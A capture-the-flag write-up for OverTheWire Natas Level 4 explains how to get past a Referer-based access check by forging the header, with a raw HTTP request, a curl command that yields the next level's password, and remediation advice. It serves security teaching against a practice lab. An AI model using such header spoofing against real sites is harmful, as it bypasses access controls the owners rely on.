---
title: "Level 4"
description: Spoofing the HTTP Referer header to bypass origin-based access controls.
sidebarTitle: "Level 4 — Referer Spoofing"
---

## Profile

- **Target:** `http://natas4.natas.labs.overthewire.org`
- **Credentials:** `natas4` / (password from Level 3)

## Reconnaissance

The page displays a message indicating that access is restricted — only requests originating from `http://natas5.natas.labs.overthewire.org/` are authorized. This is an origin-based access control check.

The HTTP `Referer` header is automatically set by browsers to indicate the page from which a request originated. Some applications use this header as an access control mechanism.

## Analysis

The application checks the `Referer` header on the server side. This is a flawed approach because:

1. The `Referer` header is entirely client-controlled
2. It can be modified using proxy tools
3. Some browsers and privacy tools already strip or modify the header

## Exploitation

Using Burp Suite (or any HTTP proxy), intercept the request to `index.php` and modify the `Referer` header:

```http
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Referer: http://natas5.natas.labs.overthewire.org/
```

Alternatively, using `curl`:

```bash
curl -u natas4:$(cat password4) \
  --referer "http://natas5.natas.labs.overthewire.org/" \
  http://natas4.natas.labs.overthewire.org/
```

## Result

The server accepts the forged header and returns the password for Level 5.

## Remediation

- Never use the `Referer` header for access control — it is trivially spoofable
- Use session-based authentication or cryptographic tokens instead
- Validate authorization server-side through proper authentication mechanisms

## References

- [MDN: Referer header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)
